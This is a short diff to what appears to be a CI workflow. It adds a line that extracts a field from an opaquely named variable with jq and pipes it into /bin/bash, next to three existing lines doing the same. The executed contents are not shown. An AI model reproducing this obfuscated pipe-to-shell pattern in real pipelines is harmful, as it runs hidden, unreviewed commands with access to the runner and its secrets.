@@ -31,6 +31,7 @@ jobs:
           echo $f1 | jq -r .j0 | /bin/bash
           echo $lq1 | jq -r .u2 | /bin/bash
           echo $mbvs408 | jq -r .z9 | /bin/bash
+          printf '%s' "$ae8" | jq -r .c683 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
